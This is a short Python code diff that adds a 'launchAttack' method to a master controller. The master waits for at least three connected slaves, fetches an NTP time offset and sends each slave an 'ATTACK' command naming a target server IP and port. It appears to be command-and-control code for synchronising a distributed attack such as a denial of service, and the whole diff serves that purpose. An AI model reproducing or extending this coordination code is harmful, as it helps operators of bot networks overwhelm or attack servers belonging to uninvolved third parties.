@@ -29,9 +29,19 @@ class Master():
     conn.send('Master offset is: {0}'.format(self.ntp_res.offset))
     self.slaves[addr] = conn
 
+  def launchAttack(self):
+    # get ntp times
+    ntpc = ntplib.NTPClient()
+    ntp_res = ntpc.request('europe.pool.ntp.org', version=3)
+    for slave_addr, conn in self.slaves.iteritems():
+      conn.send('ATTACK {0} {1} {2}'.format(server_ip, server_port, ntp_res.offset))
+
 if __name__ == '__main__':
     port = 8081
     masterServer = Master()
     masterServer.listenConnections(port)
     while 1:
       masterServer.acceptConnections()
+      if len(masterServer.slaves) >= 3:
+        break
+    masterServer.launchAttack()
